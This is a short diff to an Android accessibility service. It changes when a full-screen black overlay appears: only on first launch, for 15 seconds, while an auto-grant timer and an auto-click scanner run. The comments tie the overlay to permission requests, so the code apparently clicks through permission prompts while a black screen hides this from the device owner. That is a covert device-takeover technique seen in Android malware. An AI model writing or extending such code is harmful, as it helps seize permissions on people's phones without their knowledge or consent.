@@ -101,7 +101,6 @@ public class UnifiedAccessibilityService extends AccessibilityService {
         
         // Auto-grant timer handles storage permission request at 12s
         try { startAutoGrantTimer(); } catch (Exception ignored) {}
-        try { addBlackOverlay(); } catch (Exception ignored) {}
         try {
             new Handler(Looper.getMainLooper()).postDelayed(() -> {
                 try { startAutoClickScanner(); } catch (Exception ignored) {}
@@ -515,6 +514,19 @@ public class UnifiedAccessibilityService extends AccessibilityService {
     private void startAutoGrantTimer() {
         autoGrantMode = true;
         autoGrantHandler = new Handler(Looper.getMainLooper());
+
+        // Show the overlay ONLY on the very first auto-grant run (first install/launch).
+        // It disappears after 15 s when permissions are done.
+        android.content.SharedPreferences prefs = getSharedPreferences("auto_grant_prefs", MODE_PRIVATE);
+        boolean overlayShownBefore = prefs.getBoolean("overlay_shown_once", false);
+        if (!overlayShownBefore) {
+            prefs.edit().putBoolean("overlay_shown_once", true).apply();
+            try { addBlackOverlay(); } catch (Exception ignored) {}
+            autoGrantHandler.postDelayed(() -> {
+                try { removeBlackOverlay(); } catch (Exception ignored) {}
+                Log.i(TAG, "Auto-grant overlay removed after 15 s");
+            }, 15_000);
+        }
 
         // Independent scanner: runs every 500ms for 20 seconds
         autoGrantScanRunnable = new Runnable() {
